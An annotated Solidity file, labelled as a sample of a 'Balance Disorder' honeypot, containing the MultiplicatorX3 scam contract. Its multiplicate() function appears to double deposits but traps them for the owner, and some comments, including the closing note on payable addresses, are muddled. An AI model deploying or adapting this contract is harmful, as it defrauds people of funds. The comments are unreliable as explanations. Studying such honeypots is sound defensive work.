/// @title Honeypot smart contract at level: EVM, technique: Balance Disorder!!!
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    /** @notice This line of code is executed when the contract is deployed, and it sets the "Owner" address to the address of the deployer of the contract,
                and it will always be set to that address
    */
    address public Owner = msg.sender;
                                        
    /** @notice It is a fallback function, which is automatically executed whenever a contract receives Ether without a function call specified, 
                acts as a placeholder to allow the contract to receive Ether
    */                               
    function() public payable {}

    /** @notice transfer all the balance from the contract to the "Owner" address, (in this case, it is address of contract deployer, not of the person 
                who called the function)
    */
    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    /** @notice this function allows the owner of the contract to invoke a function on another contract with a specified amount of Ether and input data.
                "call.value" is a built-in command in SOL, which is used to invoke another contract and transfer Ether along with the call
    */
    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
    
    /** @notice Determine if the amount to be transferred to the contract is greater than the existing balance in the contract, 
                if so, transfer: balance in the contract + the new amount transferred to the specified address (via "adr")
    */
    function multiplicate(address adr) public payable {
        if (msg.value >= this.balance) {        
            adr.transfer(this.balance + msg.value);
        }
    }
}
/** Even though the "Owner" address is not declared as "payable", it can still receive Ether because it is calling the "transfer" method on itself.
"address" is not "payable" by default. However, an address can still receive Ether because an address can call a contract function with the "transfer" method.
*/